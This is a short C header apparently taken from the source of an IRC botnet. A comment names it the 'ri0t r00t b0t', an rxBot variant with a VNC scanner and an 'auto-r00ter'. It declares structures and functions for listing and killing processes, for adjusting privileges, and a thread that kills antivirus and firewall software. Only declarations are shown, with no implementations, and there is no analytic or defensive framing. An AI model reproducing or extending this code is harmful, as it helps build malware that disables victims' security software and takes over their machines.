/*

    ri0t r00t b0t by h1t3m of h1t3m.org | h4cky0u.org

     (rxBot MP modded with vnc scanner / auto-r00ter)

*/


#ifndef NO_PROCESS
typedef struct LPROC
{
	SOCKET sock;
	char chan[MAXCHANLEN];
	int threadnum;
	BOOL full;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} LPROC;

int listProcesses(SOCKET sock, char *chan, BOOL notice, char *proccess, BOOL killthread=FALSE, BOOL full=false);
DWORD WINAPI listProcessesThread(LPVOID param);
#ifndef NO_AVFW_KILL
DWORD WINAPI KillAVThread(LPVOID param);
#endif
#endif
int killProcess(int pid);
BOOL AdjustPrivileges(char *pPriv, BOOL add);
